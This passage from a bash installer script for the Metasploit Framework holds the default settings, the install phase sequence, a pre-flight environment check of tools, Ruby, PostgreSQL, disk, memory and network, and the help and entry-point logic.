        MSF_USER="${MSF_USER:-msf}"
        MSF_DB="${MSF_DB:-msf}"
        MSF_INSTALL_DIR="${MSF_INSTALL_DIR:-$HOME/metasploit-framework}"
        MSF_DIR="${MSF_DIR:-$HOME/.msf4}"
        MSF_BRANCH="${MSF_BRANCH:-master}"
        PG_PORT="${PG_PORT:-5432}"
        USE_PASSWORD="${USE_PASSWORD:-true}"

        PG_HOST="${PG_HOST:-127.0.0.1}"
        PG_SUPERUSER="${PG_SUPERUSER:-}"
        PG_SUPERUSER_PASS="${PG_SUPERUSER_PASS:-}"
        PG_MODE="${PG_MODE:-}"
        PG_DATA_DIR="${PG_DATA_DIR:-$HOME/.msf4/postgres}"
    fi

    # Load existing state
    load_state

    # Run wizard
    [[ "$INTERACTIVE" == "true" ]] && run_wizard

    # Execute phases
    detect_environment
    install_dependencies || { err "Phase 1 failed"; exit 1; }
    setup_postgresql
    install_metasploit
    install_gems
    create_configs
    verify_installation
    print_summary
    print_quickstart_menu

    save_state
    log "State saved to ${STATE_FILE}"
}

#==============================================================================
# PRE-FLIGHT CHECK (--check)
#==============================================================================
run_preflight_check() {
    echo ""
    echo -e "${CYAN}${BOLD}════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}              PRE-FLIGHT CHECK — ENVIRONMENT VALIDATION              ${NC}"
    echo -e "${CYAN}${BOLD}════════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${DIM}Checking requirements without installing...${NC}"
    echo ""

    local PF_PASS=0 PF_FAIL=0 PF_WARN=0

    pf_check() {
        local desc="$1"; shift
        if eval "$@" &>/dev/null; then
            echo -e "  ${GREEN}[✓]${NC} ${desc}"; ((PF_PASS++)) || true
        else
            echo -e "  ${RED}[✗]${NC} ${desc}"; ((PF_FAIL++)) || true
        fi
    }

    pf_warn() { echo -e "  ${YELLOW}[!]${NC} $*"; ((PF_WARN++)) || true; }

    echo -e "${BOLD}── OS & Platform ──${NC}"
    pf_check "OS: $(uname -s)" "true"
    pf_check "Arch: $(uname -m)" "true"
    [[ -d "/data/data/com.termux" ]] && echo -e "  ${BLUE}[i]${NC} Termux detected"
    [[ -f /etc/os-release ]] && . /etc/os-release && echo -e "  ${BLUE}[i]${NC} Distro: ${PRETTY_NAME:-$ID}"

    echo ""
    echo -e "${BOLD}── Package Manager ──${NC}"
    if command -v apt-get &>/dev/null || command -v apt &>/dev/null; then pf_check "APT" "true"
    elif command -v pkg &>/dev/null; then pf_check "PKG (Termux)" "true"
    elif command -v dnf &>/dev/null; then pf_check "DNF" "true"
    elif command -v yum &>/dev/null; then pf_check "YUM" "true"
    elif command -v pacman &>/dev/null; then pf_check "Pacman" "true"
    elif command -v zypper &>/dev/null; then pf_check "Zypper" "true"
    else pf_warn "No known package manager"; fi

    echo ""
    echo -e "${BOLD}── Core Tools ──${NC}"
    pf_check "git" "command -v git"
    pf_check "curl" "command -v curl"
    pf_check "wget" "command -v wget"

    echo ""
    echo -e "${BOLD}── Ruby ──${NC}"
    if command -v ruby &>/dev/null; then
        pf_check "Ruby: $(ruby --version 2>&1 | head -c 50)" "true"
        local r_major r_minor
        r_major=$(ruby -e 'puts RUBY_VERSION.split(".")[0].to_i' 2>/dev/null || echo 0)
        r_minor=$(ruby -e 'puts RUBY_VERSION.split(".")[1].to_i' 2>/dev/null || echo 0)
        [[ "$r_major" -gt 2 ]] || { [[ "$r_major" -eq 2 ]] && [[ "$r_minor" -ge 7 ]]; } && pf_check "Ruby >= 2.7" "true" || pf_warn "Ruby version $(ruby -e 'puts RUBY_VERSION' 2>/dev/null) — need >= 2.7"
    else
        pf_check "Ruby installed" "false"
    fi

    echo ""
    echo -e "${BOLD}── Build Tools ──${NC}"
    pf_check "gcc/clang" "command -v gcc || command -v clang"
    pf_check "g++/clang++" "command -v g++ || command -v clang++"
    pf_check "make" "command -v make"

    echo ""
    echo -e "${BOLD}── PostgreSQL ──${NC}"
    pf_check "psql client" "command -v psql"
    pf_check "pg_ctl (server)" "command -v pg_ctl"
    pf_check "pg_isready" "command -v pg_isready"
    if command -v pg_isready &>/dev/null; then
        for p in 5432 5433 15432 54321; do
            pg_isready -h 127.0.0.1 -p "$p" -q 2>/dev/null && { echo -e "  ${BLUE}[i]${NC} PostgreSQL running on port ${p}"; break; }
        done
    fi

    echo ""
    echo -e "${BOLD}── Disk Space ──${NC}"
    local avail_kb=$(df -k "$HOME" 2>/dev/null | tail -1 | awk '{print $4}' || echo 0)
    local avail_mb=$((avail_kb / 1024))
    [[ $avail_mb -gt 3000 ]] && pf_check "Disk: ${avail_mb}MB (need ~2GB)" "true" ||
    [[ $avail_mb -gt 1500 ]] && pf_warn "Disk: ${avail_mb}MB — tight" ||
    [[ $avail_kb -gt 0 ]] && pf_warn "Disk: ${avail_mb}MB — LOW (<2GB!)"

    echo ""
    echo -e "${BOLD}── Network ──${NC}"
    curl -s --connect-timeout 5 https://github.com >/dev/null 2>&1 && pf_check "GitHub accessible" "true" || pf_warn "GitHub not accessible — clone will fail!"

    echo ""
    echo -e "${BOLD}── Memory ──${NC}"
    local mem_kb=$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}' || echo 0)
    local mem_mb=$((mem_kb / 1024))
    [[ $mem_mb -gt 1000 ]] && pf_check "RAM: ${mem_mb}MB" "true" ||
    [[ $mem_mb -gt 400 ]] && pf_warn "RAM: ${mem_mb}MB — minimum" ||
    [[ $mem_kb -gt 0 ]] && pf_warn "RAM: ${mem_mb}MB — VERY LOW!"

    echo ""
    echo -e "${BOLD}────────────────────────────────────────${NC}"
    echo -e "  ${BOLD}Results:${NC} ${GREEN}${PF_PASS} OK${NC} / ${RED}${PF_FAIL} Missing${NC} / ${YELLOW}${PF_WARN} Warnings${NC}"
    echo ""

    [[ $PF_FAIL -gt 0 ]] && warn "Script will attempt to install missing packages"
    [[ $mem_mb -lt 400 && $mem_kb -gt 0 ]] && err "RAM too low (${mem_mb}MB) — setup likely to fail. Need 512MB+."
    echo ""
}

#==============================================================================
# ENTRY POINT
#==============================================================================
if [[ "${1:-}" == "--help" ]] || [[ "${1:-}" == "-h" ]]; then
    echo "Usage: bash setup-metasploit.sh [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  (no flags)         Interactive wizard mode"
    echo "  --no-interactive   Auto-setup with defaults (password: msfpass)"
    echo "  --auto             Same as --no-interactive"
    echo "  --check            Pre-flight check only (validate environment)"
    echo "  --help, -h         Show this help"
    echo ""
    echo "Examples:"
    echo "  bash setup-metasploit.sh                   # Interactive"
    echo "  bash setup-metasploit.sh --auto            # One-command auto-setup"
    echo "  bash setup-metasploit.sh --check           # Environment check only"
    echo "  bash setup-metasploit.sh --check && bash setup-metasploit.sh --auto"
    exit 0
fi

if [[ "${1:-}" == "--check" ]]; then
    MSF_INSTALL_DIR="${MSF_INSTALL_DIR:-$HOME/metasploit-framework}"
    run_preflight_check
    exit 0
fi

main "$@"